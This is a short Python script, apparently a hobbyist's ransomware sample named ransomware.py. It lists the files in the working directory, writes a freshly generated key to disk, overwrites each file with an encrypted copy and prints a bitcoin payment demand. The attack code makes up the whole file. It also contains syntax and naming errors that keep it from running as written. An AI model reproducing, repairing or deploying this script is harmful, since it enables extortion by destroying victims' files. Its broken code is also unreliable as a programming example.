#!/usr/bin/env python3 

# Encrypt

import os 
from cryptography.fernet import fernet

# Find files

files = []

# Ignores the encryptor, decryptor and key from encryption
for file in os.listdir()
    if file == "ransomware.py" or file =="key.key":
        continue
    if os.path.isfile(file)
        files.append(file)
        
print(files)

# Creates a key 
key = fernet.generate_key()
# Function to write the key as binary
with open("key.key", "wb") as key:
    key.write(key)
# For loop to read the files and encrypt them using fernet    
for file in files:
    with open(file,"rb") as thefile:
            contents = thefile.read()
    encrypt_content = fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
   
   print("Your files have been encrypted visit youbeenpwned.com/paymebitc0in$ to provide payment and receive the key to restore your files"\n)
   
  else:    
        
  print("")
  

  
 
  
